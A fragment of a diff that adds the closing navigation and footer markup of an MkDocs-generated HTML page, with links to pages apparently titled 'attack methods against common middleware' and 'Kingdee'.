+      <a href="../../../%E5%B8%B8%E8%A7%81%E4%B8%AD%E9%97%B4%E4%BB%B6%E7%9A%84%E6%94%BB%E5%87%BB%E6%96%B9%E5%BC%8F/%E5%B8%B8%E8%A7%81%E4%B8%AD%E9%97%B4%E4%BB%B6%E7%9A%84%E6%94%BB%E5%87%BB%E6%96%B9%E5%BC%8F/" class="btn btn-xs btn-link">
+        常见中间件的攻击方式
+      </a>
+    </div>
+    
+    <div class="wm-article-nav">
+      <a href="../../%E9%87%91%E8%9D%B6/%E9%87%91%E8%9D%B6/" class="btn btn-xs btn-default pull-left">
+        <i class="fa fa-chevron-left" aria-hidden="true"></i>
+        Previous</a><a href="../../%E9%87%91%E8%9D%B6/%E9%87%91%E8%9D%B6/" class="btn btn-xs btn-link">
+        金蝶
+      </a>
+    </div>
+    
+  </div>
+
+    <br>
+</div>
+
+<footer class="container-fluid wm-page-content">
+  <p>Documentation built with <a href="https://www.mkdocs.org/">MkDocs</a> using <a href="https://github.com/gristlabs/mkdocs-windmill">Windmill</a> theme by Grist Labs.</p>
+</footer>
+
+</body>
+</html>
